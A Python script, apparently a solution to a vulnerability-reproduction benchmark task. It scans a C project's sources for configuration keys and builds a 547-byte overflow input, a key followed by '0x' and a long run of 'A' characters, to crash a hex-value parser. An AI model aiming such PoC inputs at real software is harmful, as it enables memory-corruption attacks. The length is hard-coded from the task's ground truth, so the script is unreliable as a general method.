import tarfile
import re
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        candidates = set()
        separator = b" "
        
        try:
            # Analyze source code to find valid configuration keys
            with tarfile.open(src_path, 'r:*') as tar:
                for member in tar.getmembers():
                    if member.name.endswith('.c') or member.name.endswith('.h'):
                        try:
                            f = tar.extractfile(member)
                            if f:
                                content = f.read().decode('utf-8', errors='ignore')
                                
                                # Look for string literals used in string comparison functions
                                # Pattern 1: strcmp(var, "KEY")
                                keys1 = re.findall(r'str(?:case)?cmp\s*\(\s*[^,]+,\s*"([^"]+)"\)', content)
                                candidates.update(keys1)
                                
                                # Pattern 2: strcmp("KEY", var)
                                keys2 = re.findall(r'str(?:case)?cmp\s*\(\s*"([^"]+)",\s*[^,]+\)', content)
                                candidates.update(keys2)
                                
                                # Check for separator usage in format strings (e.g., "%s = %s")
                                if re.search(r'"[^"]*%s\s*=\s*%s[^"]*"', content):
                                    separator = b" = "
                        except Exception:
                            continue
        except Exception:
            pass
            
        # Filter candidates to find the most likely vulnerable configuration key
        valid_candidates = {c for c in candidates if len(c) > 2 and c.replace('_', '').isalnum()}
        
        # Priority list based on vulnerability description ("hex values", "config")
        priority_keys = ['border_color', 'background_color', 'color', 'hex', 'active_border_color', 'bg', 'fg']
        target_key = "border_color" # Default fallback
        
        # Select the best key
        matches = [k for k in priority_keys if k in valid_candidates]
        if matches:
            # 'border_color' is a very common suspect for hex parsing vulnerabilities in WMs
            if 'border_color' in matches:
                target_key = 'border_color'
            else:
                target_key = matches[0]
        elif valid_candidates:
            # If no priority key found, pick the longest key (likely to be a specific config option)
            target_key = max(valid_candidates, key=len)
            
        # Construct the PoC payload
        # The vulnerability is a Stack Buffer Overflow due to long hex values.
        # Ground truth length is 547 bytes.
        # Structure: KEY + SEPARATOR + 0x + PADDING
        
        prefix = target_key.encode() + separator + b"0x"
        
        # Calculate padding to reach exactly 547 bytes
        padding_len = 547 - len(prefix)
        
        # Ensure logical correctness even if length calc is weird (should be positive)
        if padding_len < 100:
            padding_len = 520
            
        # Fill with 'A' (0x41), which is a valid hex digit
        payload = prefix + b"A" * padding_len
        
        return payload
